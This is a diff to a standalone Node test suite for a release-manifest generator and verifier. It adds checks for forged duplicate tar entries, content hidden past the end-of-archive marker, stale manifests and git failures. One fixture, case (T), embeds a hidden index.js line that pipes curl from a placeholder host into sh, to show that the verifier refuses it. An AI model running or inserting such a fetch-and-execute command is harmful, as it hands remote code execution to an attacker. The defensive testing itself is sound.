@@ -24,13 +24,25 @@
  *       embedding the manifest leaves verification green, and the run reports that the tarball
  *       carries THESE bytes. Embedding a DIFFERENT manifest is red: the exclusion must not become a
  *       hole an attacker can post anything through.
+ *   (D) A DUPLICATE ENTRY PATH IS REFUSED — the general form of the substitution (X) forbids: the
+ *       genuine manifest first, a forged one second. Extraction keeps the LAST entry, the file-list
+ *       digest excludes BOTH, so a reader that tolerated the duplicate would compare bytes nobody
+ *       installs. Pinned on the launcher, the one member that records no tarball integrity.
+ *   (T) CONTENT PAST THE END-OF-ARCHIVE MARKER IS REFUSED — tar's marker is two zero blocks, but
+ *       `tar` and the node-tar `npm i` runs treat a LONE zero block as a warning and keep reading,
+ *       so an entry appended after one is what gets installed. A reader that stopped there would
+ *       hash one archive while the consumer receives another.
+ *   (Q) THE DOCUMENTED RELEASE SEQUENCE REPEATS — the manifest is gitignored and listed in the
+ *       launcher's `files`, so it SURVIVES a release run and the next pack would ship the previous
+ *       run's manifest. Running the sequence twice (with the removal step it prescribes) is green
+ *       both times; skipping that step is a refusal that names it, not an unverifiable release.
  *   (R) THE MANIFEST REPRODUCES FROM THE SAME INPUTS — two runs over the same checkout and the same
  *       tarballs produce byte-identical manifests. A manifest carrying a timestamp or an unordered
  *       map cannot be re-derived by anyone, which is the whole point of it.
  *   (K) THE CONTENT DIGEST SURVIVES A RE-PACK — `pnpm pack` rewrites `workspace:*` into the packed
  *       `package.json` and does NOT emit that map in a stable key order (measured on this repo: two
- *       consecutive `--pack` runs of one commit differed in 10 and in 12 of the 29 tarballs, the
- *       difference confined every time to that file's key order). The file-list digest canonicalises
+ *       consecutive `--pack` runs of one commit differed in 10 to 12 of the 29 tarballs across four
+ *       pairs, the difference confined every time to that file's key order). The digest canonicalises
  *       `package.json` for exactly that reason, so it identifies the same package across packs while
  *       the tarball integrity — which identifies one artifact, not a build — legitimately moves.
  *   (N) NOTHING IS FABRICATED — before the release tag exists the tag is recorded as absent with a
@@ -38,11 +50,16 @@
  *       the annotated tag on HEAD and an Actions environment present, both are recorded for real.
  *   (W) A DIRTY WORKING TREE IS RECORDED, NOT HIDDEN — a modified tracked file makes the manifest
  *       say so and name the path. A release identity that quietly claims a clean tree is a lie.
+ *   (G) AND NEITHER IS A GIT FAILURE — when `git diff` cannot answer (here: a `required` clean
+ *       filter whose binary is absent, the everyday form being a missing git-lfs), its empty output
+ *       looks exactly like a clean tree. Generation refuses instead of writing the flattering value.
  *   (C) AN INCOMPLETE CLOSURE IS NOT A CLOSURE — a directory missing a package that another member
  *       depends on refuses instead of emitting a manifest that describes most of a release.
  *   (Z) NEITHER MODE TOUCHES THE PACKAGE MANAGER — generating and verifying are pure file reads.
- *       The child runs with a stub `pnpm`/`npm` FIRST on PATH, the publish gate armed and the
- *       registry pointed at an unroutable address; the stub log must stay empty in every case.
+ *       Every child runs with a stub `pnpm`/`npm` FIRST on PATH, the publish gate armed and the
+ *       registry pointed at an unroutable address, and `run()` asserts the stub log stayed empty on
+ *       EVERY launch — enforced where children are started, so no case can forget it or, because the
+ *       log is truncated per run, silently discard the evidence.
  *
  * Standalone (no test framework is wired for the repo scripts): `node <thisfile>`; exit 0 = pass.
  */
@@ -51,6 +68,7 @@ import { spawnSync } from 'node:child_process';
 import {
   chmodSync,
   copyFileSync,
+  existsSync,
   mkdirSync,
   mkdtempSync,
   readFileSync,
@@ -233,6 +251,11 @@ function fixture({ tags = [], reverseDeps = false, only = null } = {}) {
  * Drive the REAL script inside the fixture. The package manager is shadowed on PATH, the publish
  * gate is armed and the registry points at an unroutable address — so a package-manager call would
  * be recorded by the stub and a registry call could not complete even if the stub were bypassed.
+ *
+ * (Z) is asserted HERE, on every launch, rather than case by case: the log is truncated per run, so
+ * a case that forgot to check it would discard its own evidence and the property would quietly hold
+ * for fewer runs than the suite claims. Enforcing it in the one place that starts a child makes the
+ * claim structural — every child this file ever starts is covered, including ones added later.
  */
 function run(fx, args, { env = {} } = {}) {
   const log = join(fx.root, 'pm-calls.log');
@@ -251,6 +274,11 @@ function run(fx, args, { env = {} } = {}) {
     },
   });
   const calls = readFileSync(log, 'utf8').split('\n').filter(Boolean);
+  assert.deepEqual(
+    calls,
+    [],
+    `(Z) neither mode may invoke a package manager, but \`${args.join(' ')}\` did: ${JSON.stringify(calls)}`,
+  );
   return { code: res.status, out: res.stdout ?? '', err: res.stderr ?? '', calls };
 }
 
@@ -266,15 +294,6 @@ function generate(fx, args = [], opts = {}) {
 const verify = (fx, args = [], opts = {}) =>
   run(fx, ['--verify', '--tarballs', fx.tarDir, ...args], opts);
 const entryFor = (manifest, name) => manifest.closure.find((m) => m.name === name);
-
-/** Every case: the run must never have started a package manager. */
-function assertNoPackageManager(r, label) {
-  assert.deepEqual(
-    r.calls,
-    [],
-    `${label} neither mode may invoke a package manager, got ${JSON.stringify(r.calls)}`,
-  );
-}
 
 try {
   // ── (R) + the manifest's content: two runs over the same inputs agree to the byte ──────────────
@@ -319,7 +338,6 @@ try {
         /sha(256|512)/,
         `(R) algorithms.${key} must state its hash function`,
       );
-    assertNoPackageManager(first, '(R)');
     console.log('ok (R) — the manifest is a pure function of the checkout and the tarballs');
   }
 
@@ -352,7 +370,6 @@ try {
     generate(fx);
     const r = verify(fx);
     assert.equal(r.code, 0, `(P) an untouched directory must verify; got ${r.code}: ${r.err}`);
-    assertNoPackageManager(r, '(P)');
     console.log('ok (P) — the manifest verifies against the tarballs it was generated from');
   }
 
@@ -369,7 +386,6 @@ try {
     assert.notEqual(r.code, 0, `(B) an altered tarball must fail verification; got ${r.code}`);
     assert.match(r.err, /@rayspec\/core/, `(B) the failing package must be named: ${r.err}`);
     assert.match(r.err, /integrity/i, `(B) the failing check must be named: ${r.err}`);
-    assertNoPackageManager(r, '(B)');
     console.log('ok (B) — a tarball whose bytes moved fails, even with identical contents');
   }
 
@@ -388,7 +404,6 @@ try {
     assert.notEqual(r.code, 0, `(F) an altered file list must fail verification; got ${r.code}`);
     assert.match(r.err, /rayspec/, `(F) the failing package must be named: ${r.err}`);
     assert.match(r.err, /file/i, `(F) the failing check must be named: ${r.err}`);
-    assertNoPackageManager(r, '(F)');
     console.log(
       'ok (F) — a file added to the launcher fails, though it records no tarball integrity',
     );
@@ -454,8 +469,140 @@ try {
       new RegExp(MANIFEST_NAME),
       `(X) the mismatch must name it: ${swapped.err}`,
     );
-    assertNoPackageManager(swapped, '(X)');
     console.log('ok (X) — the launcher is verifiable from the manifest it ships');
+  }
+
+  // ── (D) two entries at one path — the genuine manifest, then a forged one — is refused ─────────
+  {
+    const fx = fixture();
+    const generated = generate(fx);
+    const launcher = MEMBERS.find((m) => m.name === LAUNCHER);
+    const forged = JSON.parse(generated.bytes.toString('utf8'));
+    forged.version = '9.9.9';
+    forged.source.commit = '0'.repeat(40);
+    // Both copies sit at the excluded path, so the file-list digest skips both; extraction keeps the
+    // SECOND. Only refusing the duplicate outright makes the byte comparison mean anything.
+    writeFileSync(
+      join(fx.tarDir, tarballName(LAUNCHER)),
+      tarball([
+        ...memberFiles(launcher),
+        [`package/${MANIFEST_NAME}`, generated.bytes],
+        [`package/${MANIFEST_NAME}`, `${JSON.stringify(forged, null, 2)}\n`],
+      ]),
+    );
+    const r = verify(fx);
+    assert.notEqual(
+      r.code,
+      0,
+      `(D) a duplicate entry path must be refused; got ${r.code}: ${r.out}`,
+    );
+    assert.match(r.err, /duplicate entry path/i, `(D) the refusal must name it: ${r.err}`);
+    assert.match(r.err, new RegExp(MANIFEST_NAME), `(D) the path must be named: ${r.err}`);
+    console.log('ok (D) — a second entry at an excluded path is refused, not silently skipped');
+  }
+
+  // ── (T) an entry hidden behind a lone null block — what npm installs — is refused ──────────────
+  {
+    const fx = fixture();
+    generate(fx);
+    const launcher = MEMBERS.find((m) => m.name === LAUNCHER);
+    const blocks = memberFiles(launcher).map(([p, b]) => tarEntry(p, Buffer.from(b)));
+    writeFileSync(
+      join(fx.tarDir, tarballName(LAUNCHER)),
+      gzipSync(
+        Buffer.concat([
+          ...blocks,
+          Buffer.alloc(512), // a LONE zero block: tar warns and reads on, npm installs what follows
+          tarEntry(
+            'package/dist/index.js',
+            Buffer.from("require('child_process').exec('curl example.invalid|sh');\n"),
+          ),
+          Buffer.alloc(1024),
+        ]),
+      ),
+    );
+    const r = verify(fx);
+    assert.notEqual(
+      r.code,
+      0,
+      `(T) content past the marker must be refused; got ${r.code}: ${r.out}`,
+    );
+    assert.match(r.err, /end-of-archive marker/i, `(T) the refusal must name it: ${r.err}`);
+    console.log('ok (T) — an archive whose tail only tar would read is refused, not half-read');
+  }
+
+  // ── (Q) the documented release sequence, run twice ─────────────────────────────────────────────
+  {
+    const fx = fixture();
+    const launcher = MEMBERS.find((m) => m.name === LAUNCHER);
+    const manifestPath = join(fx.root, 'packages/app/rayspec', MANIFEST_NAME);
+    // Step 2 of the sequence: the pack ships whatever the launcher directory holds — `files` says so.
+    const pack = () =>
+      writeFileSync(
+        join(fx.tarDir, tarballName(LAUNCHER)),
+        tarball(
+          memberFiles(launcher, {
+            extra: existsSync(manifestPath)
+              ? [[`package/${MANIFEST_NAME}`, readFileSync(manifestPath)]]
+              : [],
+          }),
+        ),
+      );
+
+    pack();
+    const firstRun = generate(fx);
+    const firstVerify = verify(fx);
+    assert.equal(
+      firstVerify.code,
+      0,
+      `(Q) release 1 must verify; got ${firstVerify.code}: ${firstVerify.err}`,
+    );
+
+    // Release 2. A re-pack legitimately moves some tarball bytes (pnpm rewrites `workspace:*` into
+    // the packed manifest without a stable key order), so the manifest release 2 writes can never
+    // equal the one release 1 left behind.
+    const victim = MEMBERS.find((m) => m.name === '@rayspec/core');
+    writeFileSync(
+      join(fx.tarDir, tarballName(victim.name)),
+      tarball(memberFiles(victim), { level: 1 }),
+    );
+
+    // (a) skipping step 1's removal: the pack carries release 1's manifest. Refuse, and say why.
+    pack();
+    const stale = run(fx, ['--tarballs', fx.tarDir]);
+    assert.equal(
+      stale.code,
+      2,
+      `(Q) a stale packed manifest must refuse; got ${stale.code}: ${stale.out}`,
+    );
+    assert.match(
+      stale.err,
+      new RegExp(MANIFEST_NAME),
+      `(Q) the refusal must name the file: ${stale.err}`,
+    );
+    assert.match(stale.err, /re-pack/i, `(Q) the refusal must name the remedy: ${stale.err}`);
+    assert.ok(
+      readFileSync(manifestPath).equals(firstRun.bytes),
+      '(Q) a refusal must write nothing — the previous manifest stays as it was',
+    );
+
+    // (b) following it: remove, re-pack, generate, verify.
+    rmSync(manifestPath);
+    pack();
+    const secondRun = generate(fx);
+    assert.ok(
+      !secondRun.bytes.equals(firstRun.bytes),
+      '(Q) release 2 must record the tarballs it was generated from, not the previous run',
+    );
+    const secondVerify = verify(fx);
+    assert.equal(
+      secondVerify.code,
+      0,
+      `(Q) release 2 must verify; got ${secondVerify.code}: ${secondVerify.err}`,
+    );
+    console.log(
+      'ok (Q) — the release sequence is green on every run, and loud when a step is skipped',
+    );
   }
 
   // ── (N) an absent tag and an absent workflow run are explicit nulls with reasons ───────────────
@@ -520,13 +667,36 @@ try {
     console.log('ok (W) — a dirty working tree is recorded, not smoothed over');
   }
 
+  // ── (G) git cannot answer whether the tree is clean — refuse, never claim the flattering value ─
+  {
+    const fx = fixture();
+    // A `required` clean filter whose binary is absent (a missing git-lfs is the everyday form):
+    // `git diff --name-only HEAD` exits 128 while `git rev-parse HEAD` still succeeds. A failed
+    // command produces no output, and no output is also what a clean tree looks like.
+    writeFileSync(join(fx.root, '.gitattributes'), 'pnpm-lock.yaml filter=unavailable\n');
+    gitIn(fx.root, 'config', 'filter.unavailable.clean', 'rayspec-no-such-filter-binary');
+    gitIn(fx.root, 'config', 'filter.unavailable.required', 'true');
+    writeFileSync(join(fx.root, 'pnpm-lock.yaml'), 'edited after the tag\n');
+    const r = run(fx, ['--tarballs', fx.tarDir]);
+    assert.equal(r.code, 2, `(G) an unreadable working tree must refuse; got ${r.code}: ${r.out}`);
+    assert.match(
+      r.err,
+      /working tree/i,
+      `(G) the refusal must name what could not be read: ${r.err}`,
+    );
+    assert.ok(
+      !existsSync(join(fx.root, 'packages/app/rayspec', MANIFEST_NAME)),
+      '(G) a refusal must write no manifest at all',
+    );
+    console.log('ok (G) — a git failure is not a clean tree, and is not written down as one');
+  }
+
   // ── (C) a tarball directory that is not a closure refuses ──────────────────────────────────────
   {
     const fx = fixture({ only: ['rayspec', '@rayspec/cli', '@rayspec/core'] });
     const r = run(fx, ['--tarballs', fx.tarDir]);
     assert.notEqual(r.code, 0, `(C) an incomplete closure must refuse; got ${r.code}: ${r.out}`);
     assert.match(r.err, /@rayspec\/spec/, `(C) the missing package must be named: ${r.err}`);
-    assertNoPackageManager(r, '(C)');
     console.log('ok (C) — a directory missing a dependency is not a closure and is refused');
   }
 
